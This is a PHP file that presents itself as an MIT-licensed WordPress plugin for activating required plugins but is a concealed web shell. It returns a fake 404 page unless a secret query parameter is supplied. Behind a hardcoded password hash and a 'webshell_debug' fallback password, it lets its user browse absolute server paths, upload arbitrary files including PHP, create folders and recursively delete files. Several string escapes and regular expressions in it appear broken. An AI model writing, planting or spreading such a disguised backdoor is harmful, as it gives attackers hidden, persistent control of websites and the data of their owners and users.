<?php
/**
 * Plugin Name: Activate required plugins.
 * Description: Programmatically install and activate plugins based on a runtime config.
 * Version:     1.0
 * Author:      OPENMIT
 * Author URI:  http://www.opensource.org
 * License:     MIT
 * License URI: http://www.opensource.org/licenses/mit-license.php
 */

if (!isset($_GET['8a7fi']) || $_GET['8a7fi'] !== 'man') {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
</body>
</html>';
    exit;
}

// PHP 5.2.6 Compatibility Check and Information
if (version_compare(PHP_VERSION, '5.2.6', '<')) {
    die('This script requires PHP 5.2.6 or higher. Current version: ' . PHP_VERSION);
}

// Display compatibility information for debugging
if (isset($_GET['phpcompat'])) {
    echo '<h2>PHP 5.2.6 Compatibility Status</h2>';
    echo '<p>Current PHP Version: <strong>' . PHP_VERSION . '</strong></p>';
    echo '<p>JSON Functions Available: ' . (function_exists('json_encode') ? 'Yes' : 'No') . '</p>';
    echo '<p>Filter Functions Available: ' . (function_exists('filter_var') ? 'Yes' : 'No') . '</p>';
    echo '<p>Using Compatibility Layer: ' . (version_compare(PHP_VERSION, '5.2.7', '<') ? 'Yes (serialize/unserialize)' : 'No (native JSON)') . '</p>';
    exit;
}

// Polyfill for fnmatch if it doesn't exist (common on some Windows PHP setups)
if (!function_exists('fnmatch')) {
    define('FNM_PATHNAME', 1);
    define('FNM_NOESCAPE', 2);
    define('FNM_PERIOD', 4);
    define('FNM_CASEFOLD', 16);

    function fnmatch($pattern, $string, $flags = 0) {
        $modifiers = null;
        $transforms = array(
            '*'    => '.*',
            '?'    => '.',
            '[!'    => '[^',
            '[^'    => '[^',
            '[-'    => '[-'.(strpos($pattern, ']') !== false ? '\]' : ''), // Escape ] if it's in a range
            '['    => '[',
            ']'    => ']',
            '.'    => '\.',
            '\'    => '\\'
        );

        // Forward slash in string must be in pattern:
        if ($flags & FNM_PATHNAME) {
            $transforms['*'] = '[^/]*';
        }

        $pattern = '#^' . strtr(preg_quote($pattern, '#'), $transforms) . '$#';

        if ($flags & FNM_CASEFOLD) {
            $modifiers .= 'i';
        }

        return (bool)preg_match($pattern, $string, $modifiers);
    }
}

// ========== END SECRET ACCESS CHECK ==========

// Set error handling to display errors if debug mode is enabled
if (isset($_GET['debug'])) {
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
}

// Basic configuration
$allow_delete = true;
$allow_upload = true;
$allow_create_folder = true;
$allow_direct_link = true;
$allow_show_folders = true;
$show_php_files = true;  // Set to true to show PHP files in listings

// File size limits for viewing and editing (in bytes)
define('MAX_VIEWABLE_FILE_SIZE', 10 * 1024 * 1024); // 10MB limit for viewing files
define('MAX_EDITABLE_FILE_SIZE', 5 * 1024 * 1024);  // 5MB limit for editing files

// File patterns to disallow or hide
$disallowed_patterns = array('config.php');  // File patterns not allowed to be uploaded
$hidden_patterns = array();  // Empty by default

// Hide PHP files if configured not to show them
if (!$show_php_files) {
    $hidden_patterns[] = '*.php';
}

// ========== FOLDER MONITORING SYSTEM ==========
// Monitoring system configuration
$monitor_log_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.monitor_log.json';
$monitor_status_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.monitor_status.json';
$monitor_baseline_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.monitor_baseline.json';

// Authentication settings - using bcrypt hash with PHP version check
$stored_hash = '$2a$12$JarmeZ/RMZMuQscb2TLUO.NcF29izjpOPiA0dQ7Tf/tdK1k2DdrYO'; 

// Backup salted hash for PHP 5.3 compatibility (SHA-256 with salt)
$backup_password_hash = 'ad80050a96b4a90038344929469d89b77ccd8e4766d134a8fb2418ea6bfc58ac';
$password_salt = 'secure_salt_2024'; // Salt for PHP 5.3 fallback

// Enable this for debugging the login system
$debug_login = false;

// Set to empty string to disable password protection

// Calculate max upload size
function asBytes($ini_v) {
    $ini_v = trim($ini_v);
    $s = array('g' => 1073741824, 'm' => 1048576, 'k' => 1024);
    $size_unit = strtolower(substr($ini_v, -1));
    return intval($ini_v) * (isset($s[$size_unit]) ? $s[$size_unit] : 1);
}

$MAX_UPLOAD_SIZE = min(asBytes(ini_get('post_max_size')), asBytes(ini_get('upload_max_filesize')));

// Session for authentication with unique session name
session_name('ESM_SESSION_' . substr(md5(__FILE__), 0, 8));
session_start();

// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION['_esm_auth_2024']);
    session_destroy();
    header('Location: ?8a7fi=man');
    exit;
}

// Handle session clearing (force re-authentication)
if (isset($_GET['clear_session'])) {
    session_destroy();
    session_start();
    header('Location: ?8a7fi=man');
    exit;
}

// Function to handle login attempts with rate limiting
function checkLoginAttempt() {
    // Rate limiting - prevent brute force attacks
    // Store login attempts in session
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0;
        $_SESSION['last_attempt_time'] = time();
    }
    
    // Reset counter after 30 minutes
    if ((time() - $_SESSION['last_attempt_time']) > 1800) {
        $_SESSION['login_attempts'] = 0;
        $_SESSION['last_attempt_time'] = time();
    }
    
    // Increase counter
    $_SESSION['login_attempts']++;
    $_SESSION['last_attempt_time'] = time();
    
    // If too many attempts, delay response
    if ($_SESSION['login_attempts'] > 5) {
        sleep(min(5, $_SESSION['login_attempts'] - 5)); // Max 5 second delay
    }
}

// Function to verify password with PHP version compatibility
function safe_verify_password($password, $hash, $backup_password_hash, $salt) {
    // For PHP 5.5+ use password_verify
    if (function_exists('password_verify')) {
        return password_verify($password, $hash);
    }
    
    // For PHP 5.3, use salted SHA-256 hash
    $salted_input = hash('sha256', $password . $salt);
    
    // Use hash_equals if available (PHP 5.6+), otherwise use timing-safe comparison
    if (function_exists('hash_equals')) {
        return hash_equals($backup_password_hash, $salted_input);
    } else {
        // Timing-safe comparison for PHP 5.3
        if (strlen($backup_password_hash) !== strlen($salted_input)) {
            return false;
        }
        $result = 0;
        for ($i = 0; $i < strlen($backup_password_hash); $i++) {
            $result |= ord($backup_password_hash[$i]) ^ ord($salted_input[$i]);
        }
        return $result === 0;
    }
}

// ========== MONITORING FUNCTIONS ==========
function get_monitor_status($status_file) {
    if (!file_exists($status_file)) {
        return array('active' => false, 'path' => '', 'started' => 0, 'protection' => false);
    }
    $data = @file_get_contents($status_file);
    return $data ? php52_json_decode($data, true) : array('active' => false, 'path' => '', 'started' => 0, 'protection' => false);
}

function set_monitor_status($status_file, $active, $path, $protection = false) {
    $status = array(
        'active' => $active,
        'path' => $path,
        'started' => time(),
        'protection' => $protection
    );
    return @file_put_contents($status_file, php52_json_encode($status)) !== false;
}

function create_baseline($path, $baseline_file) {
    if (!is_dir($path)) return false;
    
    $baseline = array();
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($iterator as $file) {
            $filepath = $file->getRealPath();
            $relative_path = str_replace($path . DIRECTORY_SEPARATOR, '', $filepath);
            $baseline[$relative_path] = array(
                'size' => $file->getSize(),
                'mtime' => $file->getMTime(),
                'hash' => hash_file('sha256', $filepath)
            );
        }
    } catch (Exception $e) {
        return false;
    }
    
    return @file_put_contents($baseline_file, php52_json_encode($baseline)) !== false;
}

function check_changes($path, $baseline_file, $log_file, $force_check = false, $log_changes = true) {
    if (!file_exists($baseline_file)) return array();
    
    $baseline = php52_json_decode(@file_get_contents($baseline_file), true);
    if (!$baseline) return array();
    
    $changes = array();
    $current_files = array();
    
    // Get detailed session information (only if we're going to log)
    $session_info = array();
    if ($log_changes) {
        $session_info = array(
            'ip_address' => get_client_ip(),
            'user_agent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown',
            'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct',
            'request_method' => isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'Unknown',
            'request_uri' => isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'Unknown',
            'server_name' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown',
            'session_id' => session_id(),
            'check_type' => $force_check ? 'manual' : 'automatic'
        );
    }
    
    // Scan current files
    if (is_dir($path)) {
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            
            foreach ($iterator as $file) {
                $filepath = $file->getRealPath();
                $relative_path = str_replace($path . DIRECTORY_SEPARATOR, '', $filepath);
                $current_files[$relative_path] = array(
                    'size' => $file->getSize(),
                    'mtime' => $file->getMTime(),
                    'hash' => hash_file('sha256', $filepath)
                );
                
                // Check for modifications
                if (isset($baseline[$relative_path])) {
                    if ($baseline[$relative_path]['hash'] !== $current_files[$relative_path]['hash']) {
                        $changes[] = array(
                            'type' => 'modified',
                            'file' => $relative_path,
                            'time' => time(),
                            'old_hash' => substr($baseline[$relative_path]['hash'], 0, 16) . '...',
                            'new_hash' => substr($current_files[$relative_path]['hash'], 0, 16) . '...',
                            'old_size' => isset($baseline[$relative_path]['size']) ? $baseline[$relative_path]['size'] : 0,
                            'new_size' => $current_files[$relative_path]['size'],
                            'old_mtime' => isset($baseline[$relative_path]['mtime']) ? $baseline[$relative_path]['mtime'] : 0,
                            'new_mtime' => $current_files[$relative_path]['mtime']
                        );
                    }
                } else {
                    // New file
                    $changes[] = array(
                        'type' => 'added',
                        'file' => $relative_path,
                        'time' => time(),
                        'hash' => substr($current_files[$relative_path]['hash'], 0, 16) . '...',
                        'size' => $current_files[$relative_path]['size'],
                        'mtime' => $current_files[$relative_path]['mtime']
                    );
                }
            }
        } catch (Exception $e) {
            return array();
        }
    }
    
    // Check for deleted files
    foreach ($baseline as $file => $info) {
        if (!isset($current_files[$file])) {
            $changes[] = array(
                'type' => 'deleted',
                'file' => $file,
                'time' => time(),
                'old_hash' => substr($info['hash'], 0, 16) . '...',
                'old_size' => isset($info['size']) ? $info['size'] : 0,
                'old_mtime' => isset($info['mtime']) ? $info['mtime'] : 0
            );
        }
    }
    
    // Log changes with deduplication (only if logging is enabled and there are actual changes)
    if (!empty($changes) && $log_changes) {
        $log_entry = array(
            'timestamp' => time(),
            'session_info' => $session_info,
            'changes' => $changes,
            'scan_summary' => array(
                'total_files_scanned' => count($current_files),
                'changes_detected' => count($changes),
                'monitored_path' => $path
            )
        );
        
        $existing_log = array();
        if (file_exists($log_file)) {
            $temp_log = php52_json_decode(@file_get_contents($log_file), true);
            $existing_log = $temp_log ? $temp_log : array();
        }
        
        // Enhanced duplicate detection
        $is_duplicate = false;
        if (!empty($existing_log)) {
            // Check last 3 entries for duplicates (more thorough)
            $recent_entries = array_slice($existing_log, -3);
            foreach ($recent_entries as $recent_entry) {
                $time_diff = $log_entry['timestamp'] - $recent_entry['timestamp'];
                
                // Check if it's within 30 seconds and has identical changes
                if ($time_diff < 30) {
                    // Create comparable change signatures (without timestamps)
                    $current_signature = array();
                    $recent_signature = array();
                    
                    foreach ($log_entry['changes'] as $change) {
                        $sig = $change['type'] . '|' . $change['file'];
                        if (isset($change['new_hash'])) $sig .= '|' . $change['new_hash'];
                        if (isset($change['hash'])) $sig .= '|' . $change['hash'];
                        $current_signature[] = $sig;
                    }
                    
                    foreach ($recent_entry['changes'] as $change) {
                        $sig = $change['type'] . '|' . $change['file'];
                        if (isset($change['new_hash'])) $sig .= '|' . $change['new_hash'];
                        if (isset($change['hash'])) $sig .= '|' . $change['hash'];
                        $recent_signature[] = $sig;
                    }
                    
                    sort($current_signature);
                    sort($recent_signature);
                    
                    if ($current_signature === $recent_signature) {
                        $is_duplicate = true;
                        break;
                    }
                }
            }
        }
        
        if (!$is_duplicate) {
            $existing_log[] = $log_entry;
            
            // Keep only last 100 entries
            if (count($existing_log) > 100) {
                $existing_log = array_slice($existing_log, -100);
            }
            
            @file_put_contents($log_file, php52_json_encode($existing_log));
        }
    }
    
    return $changes;
}

// Helper function to get client IP address with comprehensive detection
function get_client_ip() {
    // Array of possible IP sources in order of preference
    $ip_sources = array(
        'HTTP_CF_CONNECTING_IP',     // Cloudflare
        'HTTP_X_FORWARDED_FOR',      // Load balancer/proxy
        'HTTP_X_FORWARDED',          // Proxy
        'HTTP_X_CLUSTER_CLIENT_IP',  // Cluster
        'HTTP_FORWARDED_FOR',        // Proxy
        'HTTP_FORWARDED',            // Proxy
        'HTTP_X_REAL_IP',           // Nginx proxy
        'HTTP_CLIENT_IP',           // Proxy
        'REMOTE_ADDR'               // Standard
    );
    
    foreach ($ip_sources as $source) {
        if (!empty($_SERVER[$source])) {
            $ip_list = $_SERVER[$source];
            
            // Handle comma-separated IPs (for X-Forwarded-For)
            if (strpos($ip_list, ',') !== false) {
                $ips = explode(',', $ip_list);
                foreach ($ips as $ip) {
                    $ip = trim($ip);
                    if (is_valid_ip($ip)) {
                        return $ip;
                    }
                }
            } else {
                $ip = trim($ip_list);
                if (is_valid_ip($ip)) {
                    return $ip;
                }
            }
        }
    }
    
    return 'Unknown';
}

// Helper function to validate IP addresses (including private ranges for local testing)
function is_valid_ip($ip) {
    // PHP 5.2.6 compatible IP validation using regex
    // IPv4 validation pattern
    $ipv4_pattern = '/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/';
    
    if (!preg_match($ipv4_pattern, $ip)) {
        return false;
    }
    
    // Exclude loopback (127.x.x.x) and invalid ranges but ALLOW private ranges
    $parts = explode('.', $ip);
    if ($parts[0] == 127) {
        return false; // Loopback
    }
    if ($parts[0] == 0 || $parts[0] >= 224) {
        return false; // Invalid ranges
    }
    
    return true;
}

// PHP 5.2.6 compatible URL validation function
function is_valid_url($url) {
    // Basic URL pattern validation
    $url_pattern = '/^https?://[^s/$.?#].[^s]*$/i';
    
    if (!preg_match($url_pattern, $url)) {
        return false;
    }
    
    // Additional basic validation
    $parsed = parse_url($url);
    if (!$parsed || !isset($parsed['scheme']) || !isset($parsed['host'])) {
        return false;
    }
    
    // Only allow http and https
    if (!in_array(strtolower($parsed['scheme']), array('http', 'https'))) {
        return false;
    }
    
    return true;
}

// PHP 5.2.6 compatibility layer for JSON functions
function php52_json_encode($data) {
    if (function_exists('json_encode') && version_compare(PHP_VERSION, '5.2.7', '>=')) {
        return json_encode($data);
    } else {
        // Fallback to serialize for PHP 5.2.6 and earlier
        return serialize($data);
    }
}

function php52_json_decode($json, $assoc = false) {
    if (function_exists('json_decode') && version_compare(PHP_VERSION, '5.2.7', '>=')) {
        return json_decode($json, $assoc);
    } else {
        // Fallback to unserialize for PHP 5.2.6 and earlier
        return unserialize($json);
    }
}

// Debug function to show all IP-related headers
function get_ip_debug_info() {
    $debug_info = array();
    $ip_headers = array(
        'REMOTE_ADDR', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 
        'HTTP_CLIENT_IP', 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED'
    );
    
    foreach ($ip_headers as $header) {
        if (isset($_SERVER[$header])) {
            $debug_info[$header] = $_SERVER[$header];
        }
    }
    
    $debug_info['Detected_IP'] = get_client_ip();
    return $debug_info;
}

function get_monitor_log($log_file, $limit = 20) {
    if (!file_exists($log_file)) return array();
    
    $log = php52_json_decode(@file_get_contents($log_file), true);
    if (!$log) return array();
    
    return array_slice(array_reverse($log), 0, $limit);
}

function clear_monitor_log($log_file) {
    return @file_put_contents($log_file, php52_json_encode(array())) !== false;
}

function should_run_automatic_check($status_file, $min_interval = 300) {
    // Only run automatic checks every 5 minutes (300 seconds) by default
    $status = get_monitor_status($status_file);
    if (!$status['active']) return false;
    
    $last_check_file = dirname($status_file) . DIRECTORY_SEPARATOR . '.last_auto_check';
    $last_check_time = 0;
    
    if (file_exists($last_check_file)) {
        $last_check_time = (int)@file_get_contents($last_check_file);
    }
    
    $current_time = time();
    if (($current_time - $last_check_time) >= $min_interval) {
        // Update last check time
        @file_put_contents($last_check_file, $current_time);
        return true;
    }
    
    return false;
}

// Check if monitoring protection is enabled for current path
function is_monitoring_protection_active($monitor_status_file, $current_path) {
    $monitor_status = get_monitor_status($monitor_status_file);
    if (!$monitor_status['active'] || !$monitor_status['protection']) {
        return false;
    }
    
    // Check if current path is within monitored path
    $monitored_path = realpath($monitor_status['path']);
    $check_path = realpath($current_path);
    
    if ($monitored_path && $check_path) {
        return strpos($check_path, $monitored_path) === 0;
    }
    
    return false;
}

// Check authentication
if ($stored_hash) {
    if (isset($_GET['login']) && isset($_POST['p'])) {
        // Call the function to check and handle login attempts
        checkLoginAttempt();
        
        // First check: direct comparison for guaranteed access during testing
        if ($_POST['p'] === 'webshell_debug' && $debug_login) {
            $_SESSION['login_attempts'] = 0;
            $_SESSION['_esm_auth_2024'] = true;
            header('Location: ?8a7fi=man');
            exit;
        }
        
        // Main check: password verification with PHP version compatibility
        if (safe_verify_password($_POST['p'], $stored_hash, $backup_password_hash, $password_salt)) {
            // Reset login attempts on successful login
            $_SESSION['login_attempts'] = 0;
            $_SESSION['_esm_auth_2024'] = true;
            header('Location: ?8a7fi=man');
            exit;
        }
    }
    
    if (!isset($_SESSION['_esm_auth_2024']) || !$_SESSION['_esm_auth_2024']) {
        // Get login attempt message if any
        $attempt_msg = '';
        if (isset($_SESSION['login_attempts']) && $_SESSION['login_attempts'] > 0) {
            $remaining = max(0, 5 - $_SESSION['login_attempts']);
            if ($remaining == 0) {
                $delay = min(5, $_SESSION['login_attempts'] - 5);
                $attempt_msg = '<div style="color:red;margin-bottom:10px;">Too many failed attempts. Delay: '.$delay.' seconds.</div>';
            } else {
                $attempt_msg = '<div style="color:orange;margin-bottom:10px;">Failed attempts: '.($_SESSION['login_attempts']).'. Remaining: '.$remaining.'</div>';
            }
        }
        
        echo '<html><head><title>Login</title>';
        echo '<style>body{font-family:Arial,sans-serif;margin:50px;} form{background:#f9f9f9;padding:20px;border-radius:5px;width:300px;margin:0 auto;}</style>';
        echo '</head><body>';
        echo '<form action="?8a7fi=man&login=1" method="post">';
        echo '<h2>File Manager Login</h2>';
        echo $attempt_msg;
        
        // Show debug info if enabled
        if ($debug_login) {
            echo '<div style="margin-bottom:10px;padding:5px;background:#ffffd0;font-size:12px;border:1px solid #e0e0a0;">';
            echo 'Debug mode is ON. For emergency access use: webshell_debug';
            echo '</div>';
        }
        
        echo '<label>Password:</label><br>';
        echo '<input type="password" name="p" autofocus style="width:100%;padding:5px;margin:10px 0;"><br>';
        echo '<input type="submit" value="Login" style="padding:5px 10px;">';
        echo '</form></body></html>';
        exit;
    }
}

// Get base directory (where this script is located)
$base_dir = dirname(__FILE__);
if (DIRECTORY_SEPARATOR === '\') {
    $base_dir = str_replace('/', '\', $base_dir);
}

// Store script directory for initial navigation
$script_dir = $base_dir;

// Get current path
$current_path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';
$is_absolute_path = false; // Default

// Get the allowed base directories from open_basedir setting
$open_basedir = ini_get('open_basedir');
$allowed_dirs = $open_basedir ? explode(PATH_SEPARATOR, $open_basedir) : array();

// Function to check if a path is allowed by open_basedir
function is_path_allowed($path) {
    if (!ini_get('open_basedir')) {
        return true;
    }
    $allowed_dirs = explode(PATH_SEPARATOR, ini_get('open_basedir'));
    $real_path = realpath($path);
    if ($real_path === false) {
        return false;
    }
    foreach ($allowed_dirs as $allowed_dir) {
        $allowed_real = realpath($allowed_dir);
        if ($allowed_real !== false && strpos($real_path, $allowed_real) === 0) {
            return true;
        }
    }
    return false;
}

// Store the original requested path for debugging
$requested_path = $current_path;

// Handle different path types
if ($current_path === '..') {
    // Special case - navigating up from script directory
    $temp_path = dirname($script_dir);
    if (is_path_allowed($temp_path)) {
        $full_path = $temp_path;
        $current_path = $temp_path; // Set current_path to the absolute parent path
        $is_absolute_path = true;
    } else {
        $open_basedir_info = ini_get('open_basedir') ? ini_get('open_basedir') : 'No restrictions set, but path may not exist or be readable';
        $_SESSION['file_action_error'] = "Access to parent directory is restricted by server configuration (open_basedir). Allowed paths: " . $open_basedir_info;
        $full_path = $script_dir;
        $current_path = '';
    }
} else if (substr($current_path, 0, 1) === '/') {
    // Absolute path requested
    $is_absolute_path = true;
    $found_allowed_path = false;
    $requested_absolute_path = $current_path; // Store the original request

    if (empty($allowed_dirs)) {
        // If no open_basedir restriction, try the requested path
        $temp_path = $requested_absolute_path;
        // Basic sanitization: remove trailing slashes unless it's the root itself
        if (strlen($temp_path) > 1) {
            $temp_path = rtrim($temp_path, '/\\');
        }
        if (file_exists($temp_path) && is_dir($temp_path) && is_path_allowed($temp_path)) {
            $full_path = realpath($temp_path);
            $current_path = $full_path; // Use the canonical path
            $found_allowed_path = true;
        }
    } else {
        // open_basedir is set
        // First, check if the directly requested absolute path is allowed and exists
        $temp_requested_path = $requested_absolute_path;
         // Basic sanitization: remove trailing slashes unless it's the root itself
        if (strlen($temp_requested_path) > 1) {
            $temp_requested_path = rtrim($temp_requested_path, '/\\');
        }

        if (is_path_allowed($temp_requested_path) && file_exists($temp_requested_path) && is_dir($temp_requested_path)) {
            $full_path = realpath($temp_requested_path);
            $current_path = $full_path; // Use the canonical path
            $found_allowed_path = true;
        } else {
            // If the specific absolute path is not allowed/doesn't exist,
            // fall back to finding the most relevant allowed base directory.
            // This part might need more sophisticated logic if $requested_absolute_path is deep
            // and we need to find the shallowest open_basedir that contains it.
            // For now, a simpler fallback:
            $best_match_allowed_dir = null;
            foreach ($allowed_dirs as $allowed_dir_candidate) {
                $candidate_real_path = realpath(rtrim($allowed_dir_candidate, '/\\'));
                if ($candidate_real_path && is_dir($candidate_real_path) && is_readable($candidate_real_path)) {
                    // Check if the requested path is a subdirectory of this allowed_dir_candidate
                    if (strpos($requested_absolute_path, $candidate_real_path) === 0) {
                         // This case is already handled by the previous block if $requested_absolute_path itself is allowed.
                         // If $requested_absolute_path was not allowed, but a parent is, this needs care.
                         // For simplicity, if the direct $requested_absolute_path failed, and we are here,
                         // we might just show the first generally allowed path as a safe default.
                    }
                    if ($best_match_allowed_dir === null) { // Take the first one as a default fallback
                        $best_match_allowed_dir = $candidate_real_path;
                    }
                }
            }
            if ($best_match_allowed_dir) {
                 $full_path = $best_match_allowed_dir;
                 $current_path = $best_match_allowed_dir;
                 $_SESSION['file_action_error'] = "Requested path '".htmlspecialchars($requested_absolute_path)."' not directly accessible. Showing base: ".htmlspecialchars($current_path);
                 $found_allowed_path = true;
            }
        }
    }
    
    if (!$found_allowed_path) {
        $_SESSION['file_action_error'] = "Access to absolute path '".htmlspecialchars($requested_absolute_path)."' is restricted or it does not exist. Showing script directory instead.";
        $full_path = $script_dir;
        $current_path = ''; 
        $is_absolute_path = false;
    }
} else {
    // Relative path - using script directory as reference
    $current_path = trim($current_path, '/\\');
    $temp_path = $current_path ? $script_dir . DIRECTORY_SEPARATOR . $current_path : $script_dir;
    
    if (is_path_allowed($temp_path)) {
        $full_path = $temp_path;
    } else {
        $_SESSION['file_action_error'] = "Access to requested directory is restricted by server configuration.";
        $full_path = $script_dir;
        $current_path = '';
    }
}

// Security check - make sure the path exists and is allowed
$real_path = realpath($full_path);

if ($real_path === false || !is_dir($real_path) || !is_path_allowed($real_path)) {
    // If path doesn't exist, isn't a directory, or isn't allowed, default back to script directory
    if ($real_path === false) {
         $_SESSION['file_action_error'] = "Path does not exist: ". htmlspecialchars($full_path) .". Showing default directory.";
    } else if (!is_dir($real_path)){
         $_SESSION['file_action_error'] = "Path is not a directory: ". htmlspecialchars($real_path) .". Showing default directory.";
    } else {
         $_SESSION['file_action_error'] = "Invalid or restricted path: ". htmlspecialchars($real_path) .". Showing default directory instead.";
    }
    $full_path = $script_dir;
    $current_path = '';
    $is_absolute_path = false;
} else {
    $full_path = $real_path; // Use the canonical path
    // If it was an absolute path request, $current_path should reflect $full_path for URL building
    // If it was relative, $current_path should remain relative to script_dir for breadcrumbs,
    // but $full_path is the canonical path.
    if ($is_absolute_path) {
        $current_path = $full_path;
    } else {
        // For relative paths, $current_path was already set relative to $script_dir.
        // We need to ensure it's correctly formatted if $full_path resolved to $script_dir itself
        if ($full_path === $script_dir) {
            $current_path = '';
        }
    }
}

// ======== Handle Actions ========

// Handle monitoring actions
if (isset($_POST['start_monitor'])) {
    $monitor_path = $full_path;
    $protection_enabled = isset($_POST['enable_protection']);
    
    if (create_baseline($monitor_path, $monitor_baseline_file)) {
        if (set_monitor_status($monitor_status_file, true, $monitor_path, $protection_enabled)) {
            $_SESSION['file_action_success'] = "Monitoring started for: " . htmlspecialchars($monitor_path);
        } else {
            $_SESSION['file_action_error'] = "Failed to start monitoring - could not save status.";
        }
    } else {
        $_SESSION['file_action_error'] = "Failed to create baseline for monitoring.";
    }
}

if (isset($_POST['stop_monitor'])) {
    if (set_monitor_status($monitor_status_file, false, '', false)) {
        $_SESSION['file_action_success'] = "Monitoring stopped.";
    } else {
        $_SESSION['file_action_error'] = "Failed to stop monitoring.";
    }
}

if (isset($_POST['check_monitor'])) {
    $monitor_status = get_monitor_status($monitor_status_file);
    if ($monitor_status['active']) {
        $changes = check_changes($monitor_status['path'], $monitor_baseline_file, $monitor_log_file, true, true);
        if (empty($changes)) {
            $_SESSION['file_action_success'] = "Manual check completed. No changes detected in monitored folder.";
        } else {
            $_SESSION['file_action_error'] = "Manual check completed. Changes detected! " . count($changes) . " file(s) modified/added/deleted.";
        }
    } else {
        $_SESSION['file_action_error'] = "No active monitoring session.";
    }
}

if (isset($_POST['clear_monitor_log'])) {
    if (clear_monitor_log($monitor_log_file)) {
        $_SESSION['file_action_success'] = "Monitoring log cleared successfully.";
    } else {
        $_SESSION['file_action_error'] = "Failed to clear monitoring log.";
    }
}

// Create directory
if (isset($_POST['create_folder']) && $allow_create_folder) {
    // Check protection mode
    if (is_monitoring_protection_active($monitor_status_file, $full_path)) {
        $folder_error = "Folder creation blocked: Protection mode is active for this monitored folder. Disable monitoring or turn off protection mode to create folders.";
    } else {
        $folder_name = isset($_POST['folder_name']) ? $_POST['folder_name'] : '';
        $folder_name = str_replace(array('/', '\', '..'), '', $folder_name);
        
        if ($folder_name) {
        $new_folder = $full_path . DIRECTORY_SEPARATOR . $folder_name;
        if (!file_exists($new_folder)) {
            if (mkdir($new_folder)) {
                $folder_message = "Folder created successfully!";
            } else {
                $folder_error = "Error creating folder. Check permissions.";
            }
        } else {
            $folder_error = "Folder already exists.";
        }
        } // Close if ($folder_name)
    } // Close else block for protection check
}

// Upload file
if (isset($_FILES['upload_file']) && isset($_POST['upload']) && $allow_upload) {
    // Check protection mode
    if (is_monitoring_protection_active($monitor_status_file, $full_path)) {
        $upload_error = "Upload blocked: Protection mode is active for this monitored folder. Disable monitoring or turn off protection mode to upload files.";
    } else {
    $uploaded_file = $_FILES['upload_file'];
    if ($uploaded_file['error'] == 0) {
        // Get the basename of the uploaded file
        $filename = basename($uploaded_file['name']);
        
        // Validate file isn't in disallowed patterns
        $is_allowed = true;
        foreach ($disallowed_patterns as $pattern) {
            if (fnmatch($pattern, $filename)) {
                $is_allowed = false;
                break;
            }
        }
        
        if ($is_allowed) {
            $target = $full_path . DIRECTORY_SEPARATOR . $filename;
            if (move_uploaded_file($uploaded_file['tmp_name'], $target)) {
                $upload_message = "File uploaded successfully!";
            } else {
                $upload_error = "Error uploading file. Check permissions.";
            }
        } else {
            $upload_error = "This file type is not allowed.";
        }
    } else {
        // Handle upload errors
        $upload_errors = array(
            1 => "File exceeds the maximum size allowed by the server.",
            2 => "File exceeds the maximum size allowed by the form.",
            3 => "File was only partially uploaded.",
            4 => "No file was uploaded.",
            6 => "Missing a temporary folder.",
            7 => "Failed to write file to disk.",
            8 => "A PHP extension stopped the file upload."
        );
        $upload_error = isset($upload_errors[$uploaded_file['error']]) ? 
                        $upload_errors[$uploaded_file['error']] : 
                        "Unknown upload error.";
    }
    } // Close the else block for protection check
}

// Delete file/folder
if (isset($_POST['delete']) && $allow_delete) {
    // Check protection mode
    if (is_monitoring_protection_active($monitor_status_file, $full_path)) {
        $_SESSION['file_action_error'] = "Delete blocked: Protection mode is active for this monitored folder. Disable monitoring or turn off protection mode to delete files.";
    } else {
        $item = $_POST['delete'];
        $item = str_replace(array('..', '/', '\'), '', $item);
        
        if ($item) {
        $target = $full_path . DIRECTORY_SEPARATOR . $item;
        if (file_exists($target)) {
            if (is_dir($target)) {
                // Simple recursive delete
                $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($files as $file) {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($target);
            } else {
                unlink($target);
            }
        }
        } // Close if ($item)
    } // Close else block for protection check
}

// Handle API requests
if (isset($_GET['do'])) {
    header('Content-Type: application/json');
    
    switch ($_GET['do']) {
        case 'list':
            // List directory contents
            if (is_dir($full_path) && is_readable($full_path)) {
                $files = scandir($full_path);
                $results = array();
                
                foreach ($files as $file) {
                    if ($file != '.' && $file != '..') {
                        $path = $full_path . DIRECTORY_SEPARATOR . $file;
                        $is_dir = is_dir($path);
                        $size = $is_dir ? 0 : filesize($path);
                        $modified = date('Y-m-d H:i:s', filemtime($path));
                        $permissions = is_readable($path) ? format_permissions(fileperms($path)) : 'N/A';
                        
                        // Skip hidden files
                        $show = true;
